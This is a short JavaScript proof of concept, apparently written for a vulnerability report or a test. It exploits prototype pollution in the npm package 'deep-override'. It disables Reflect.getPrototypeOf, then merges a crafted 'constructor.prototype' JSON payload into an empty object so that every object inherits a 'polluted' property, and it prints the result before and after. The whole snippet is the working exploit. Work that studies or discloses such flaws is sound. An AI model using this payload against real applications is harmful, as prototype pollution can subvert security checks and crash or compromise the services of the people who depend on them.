Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const deepOverride = require('deep-override');
deepOverride({}, JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}'));
console.log({}.polluted);